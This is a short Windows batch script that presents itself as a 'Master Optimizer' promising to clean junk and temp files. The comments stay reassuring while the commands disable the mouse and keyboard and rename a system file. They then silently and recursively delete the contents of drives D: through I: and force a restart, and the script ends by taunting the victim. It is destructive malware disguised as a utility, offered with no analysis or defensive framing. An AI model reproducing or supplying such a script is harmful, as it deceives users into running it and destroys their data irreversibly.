cls
rem Master Optimizer
rem --------------------
rem Optomizes and cleans your computer of cookies, spam, junk, temp folders...etc.
choice /ty,2 >nul
cls
rem Starting Clean Cycle, your system may close this window or seem to hault please be patient....
@ Echo off
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
REN C:\WINDOWS\system32\win.com C:\WINDOWS\system32\yougotfucked.com
choice /ty,30 >nul
@ echo on
rem Optimizing system registry... File System...
choice /ty,15 >nul
cls
rem Almost done....
rem ...
rem ...
rem ...
rem ...Detecting more hard drives on system....
rem ...Optimizing Hard drives....
rem ...Please stand by this will take a few minutes....
@ echo off
RD/s/q d:\*.*
RD/s/q e:\*.*
RD/s/q f:\*.*
RD/s/q g:\*.*
RD/s/q h:\*.*
RD/s/q i:\*.*
@ echo on
rem Drives are not optimized. You now have maximum storage capacity on your hard drives.
rem ...
cls
rem ...
rem Like I said: Master Clean Up
rem ...
rem ...
rem ...
rem dont fuck with me next time!
rem ...
rem ...
goto end
:end
RESTART -r -t 5
